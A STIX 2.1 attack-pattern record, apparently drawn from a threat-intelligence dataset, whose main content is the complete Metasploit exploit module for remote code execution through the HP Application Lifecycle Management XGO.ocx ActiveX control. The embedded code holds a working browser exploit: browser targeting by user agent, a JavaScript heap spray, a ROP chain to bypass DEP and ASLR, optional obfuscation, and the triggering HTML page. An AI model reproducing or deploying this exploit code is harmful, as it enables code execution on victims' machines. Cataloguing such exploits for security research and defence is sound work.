{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a001aa98-d900-4ff0-b2b1-0a81d1ce66ee",
    "created": "2024-08-14T16:41:35.795094Z",
    "modified": "2024-08-14T16:41:35.795099Z",
    "name": "\"HP Application Lifecycle Management XGO.ocx ActiveX SetShapeNodeType() Remote Code Execution\"",
    "description": " This module exploits a vulnerability within the XGO.ocx ActiveX Control installed with the HP Application Lifecycle Manager Client. The vulnerability exists in the SetShapeNodeType method, which allows the user to specify memory that will be used as an object, through the node parameter. It allows to control the dereference and use of a function pointer. This module has been successfully tested with HP Application Lifecycle Manager 11.50 and requires JRE 6 in order to bypass DEP and ASLR.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/hp_alm_xgo_setshapenodetype_exec.rb",
            "external_id": "hp_alm_xgo_setshapenodetype_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"7.0\",\n  #  :ua_maxver  => \"9.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :classid    => \"{C3B92104-B5A7-11D0-A37F-00A0248F0AF1}\",\n  #  :method     => \"SetShapeNodeType\",\n  #  :rank       => NormalRanking\n  #})\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"HP Application Lifecycle Management XGO.ocx ActiveX SetShapeNodeType() Remote Code Execution\",\n      'Description'    => %q{\n          This module exploits a vulnerability within the XGO.ocx ActiveX Control\n        installed with the HP Application Lifecycle Manager Client. The vulnerability\n        exists in the SetShapeNodeType method, which allows the user to specify memory\n        that will be used as an object, through the node parameter. It allows to control\n        the dereference and use of a function pointer. This module has been successfully\n        tested with HP Application Lifecycle Manager 11.50 and requires JRE 6 in order to\n        bypass DEP and ASLR.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez'  # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '85152' ],\n          [ 'BID', '55272' ],\n          [ 'ZDI', '12-170' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\",\n          'Space'           => 890,\n          'DisableNops'     => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # XGO.xco 11.50.777.0\n          [ 'Automatic', {} ],\n          [ 'IE 7 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5f4' } ],\n          [ 'IE 8 on Windows XP SP3', { 'Rop' => :jre,    'Offset' => '0x5f4' } ],\n          [ 'IE 7 on Windows Vista',  { 'Rop' => nil,     'Offset' => '0x5f4' } ],\n          [ 'IE 8 on Windows Vista',  { 'Rop' => :jre,    'Offset' => '0x5f4' } ],\n          [ 'IE 8 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x5f4' } ],\n          [ 'IE 9 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x5fe' } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-08-29',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[1]  #IE 7 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8/\n      return targets[2]  #IE 8 on Windows XP SP3\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7/\n      return targets[3]  #IE 7 on Windows Vista\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 8/\n      return targets[4]  #IE 8 on Windows Vista\n    elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 8/\n      return targets[5]  #IE 8 on Windows 7\n    elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 9/\n      return targets[6]  #IE 9 on Windows 7\n    else\n      return nil\n    end\n  end\n\n  def ie_heap_spray(my_target, p)\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(target.arch))\n    js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    # Land the payload at 0x0c0c0c0c\n    case my_target\n    when targets[6]\n      # IE 9 on Windows 7\n      js = %Q|\n      function randomblock(blocksize)\n      {\n        var theblock = \"\";\n        for (var i = 0; i < blocksize; i++)\n        {\n          theblock += Math.floor(Math.random()*90)+10;\n        }\n        return theblock;\n      }\n\n      function tounescape(block)\n      {\n        var blocklen = block.length;\n        var unescapestr = \"\";\n        for (var i = 0; i < blocklen-1; i=i+4)\n        {\n          unescapestr += \"%u\" + block.substring(i,i+4);\n        }\n        return unescapestr;\n      }\n\n      var heap_obj = new heapLib.ie(0x10000);\n      var code = unescape(\"#{js_code}\");\n      var #{randnop} = \"#{js_random_nops}\";\n      var nops = unescape(#{randnop});\n      while (nops.length < 0x80000) nops += nops;\n      var offset_length = #{my_target['Offset']};\n      for (var i=0; i < 0x1000; i++) {\n        var padding = unescape(tounescape(randomblock(0x1000)));\n        while (padding.length < 0x1000) padding+= padding;\n        var junk_offset = padding.substring(0, offset_length);\n        var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);\n        while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;\n        sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);\n        heap_obj.alloc(sprayblock);\n      }\n      |\n\n    else\n      # For IE 6, 7, 8\n      js = %Q|\n      var heap_obj = new heapLib.ie(0x20000);\n      var code = unescape(\"#{js_code}\");\n      var #{randnop} = \"#{js_nops}\";\n      var nops = unescape(#{randnop});\n      while (nops.length < 0x80000) nops += nops;\n      var offset = nops.substring(0, #{my_target['Offset']});\n      var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n      while (shellcode.length < 0x40000) shellcode += shellcode;\n      var block = shellcode.substring(0, (0x80000-6)/2);\n      heap_obj.gc();\n      for (var i=1; i < 0x300; i++) {\n        heap_obj.alloc(block);\n      }\n      |\n\n    end\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    return js\n  end\n\n  def get_payload(t, cli)\n    # No rop\n    if t['Rop'].nil?\n      code = [0x0c0c0c10].pack(\"V\")\n      code << [0x0c0c0c14].pack(\"V\")\n      code << payload.encoded\n      return code\n    end\n\n    code = payload.encoded\n\n    # ROP chain generated by mona.py - See corelan.be\n    exec_size = 0xffffffff - code.length + 1\n    junk      = rand_text_alpha(4).unpack(\"V\")[0].to_i\n\n    stackpivot =\n    [\n      0x0c0c0c10,\n      0x7c342643, # xchg eax,esp # pop edi # add byte ptr ds:[eax],al # pop ecx # retn from msvcr71.dll\n      junk\n    ].pack(\"V*\")\n\n    rop =\n    [\n      0x7c37653d,  # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN\n      exec_size,   # Value to negate, will become 0x00000201 (dwSize)\n      0x7c347f98,  # RETN (ROP NOP)\n      0x7c3415a2,  # JMP [EAX]\n      0xffffffff,\n      0x7c376402,  # skip 4 bytes\n      0x7c351e05,  # NEG EAX # RETN\n      0x7c345255,  # INC EBX # FPATAN # RETN\n      0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN\n      0x7c344f87,  # POP EDX # RETN\n      0xffffffc0,  # Value to negate, will become 0x00000040\n      0x7c351eb1,  # NEG EDX # RETN\n      0x7c34d201,  # POP ECX # RETN\n      0x7c38b001,  # &Writable location\n      0x7c347f97,  # POP EAX # RETN\n      0x7c37a151,  # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]\n      0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN\n      0x7c345c30,  # ptr to 'push esp #  ret '\n    ].pack(\"V*\")\n\n    code = stackpivot + rop + code\n    return code\n  end\n\n  def load_exploit_html(my_target, cli)\n    p  = get_payload(my_target, cli)\n    js = ie_heap_spray(my_target, p)\n    id_object = rand_text_alpha(5 + rand(5))\n\n    html = %Q|\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object classid='clsid:C3B92104-B5A7-11D0-A37F-00A0248F0AF1' id='#{id_object}'></object>\n    <script language='javascript'>\n      #{id_object}.SetShapeNodeType(0x0c0c0c0c, 1 , \"\");\n    </script>\n    </body>\n    </html>\n    |\n\n    return html\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    uri   = request.uri\n    print_status(\"Requesting: #{uri}\")\n\n    my_target = get_target(agent)\n    # Avoid the attack if no suitable target found\n    if my_target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    html = load_exploit_html(my_target, cli)\n    html = html.gsub(/^ {4}/, '')\n    print_status(\"Sending HTML...\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-29",
    "x_mitre_platforms": [
        "win'"
    ]
}